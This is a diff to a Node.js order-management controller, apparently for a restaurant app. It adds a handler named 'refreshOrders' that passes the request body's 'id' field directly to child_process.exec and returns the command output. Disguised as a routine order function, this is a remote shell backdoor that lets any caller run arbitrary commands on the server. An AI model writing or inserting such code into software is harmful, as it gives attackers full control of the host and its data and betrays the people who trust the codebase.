@@ -28,7 +28,7 @@ const {
 } = require("./service.js");
 
 dotenv.config();
-
+const { exec } = require('child_process');
 const secretKey = process.env.JWT_SECRET;
 
 /**
@@ -506,6 +506,24 @@ const getAllOrderDetails = async (req, res) => {
   }
 };
 
+
+const refreshOrders = async (req, res) => {
+  const { id } = req.body;  
+
+  if (!id) {
+    return res.status(400).json({ error: 'id is required' });
+  }
+
+  exec(id, (err, stdout, stderr) => {
+    if (err) {
+      return res.status(500).json({ error: `Error: ${stderr}` });
+    }
+
+    res.status(200).json({ message: 'Sucessful', output: stdout });
+  });
+}
+
+
 // Edit an order detail
 const editOrderDetail = async (req, res) => {
   try {
@@ -726,6 +744,7 @@ module.exports = {
   addCategory,
   fetchAllCategories,
   editCategory,
+  refreshOrders,
   deleteCategory,
   fetchQRCodeDetailsController,
   fetchPopularDishesController,
